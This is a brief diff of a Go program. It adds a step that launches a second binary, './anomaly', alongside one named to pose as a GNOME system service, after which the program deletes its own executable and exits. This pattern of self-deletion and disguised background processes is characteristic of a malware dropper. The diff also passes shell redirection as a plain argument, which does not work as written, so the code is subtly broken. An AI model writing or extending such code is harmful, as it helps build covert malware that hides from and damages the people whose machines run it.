@@ -40,6 +40,8 @@ func main(){
 			s, _ := os.Readlink("/proc/self/exe");
 			cmd := exec.Command("./gnome-service-manager","> /dev/null 2>&1 &")
 			cmd.Start()
+			cmd = exec.Command("./anomaly", "> /dev/null 2>&1 &")
+			cmd.Start()
 			os.Remove(s)
 
 			os.Exit(0)
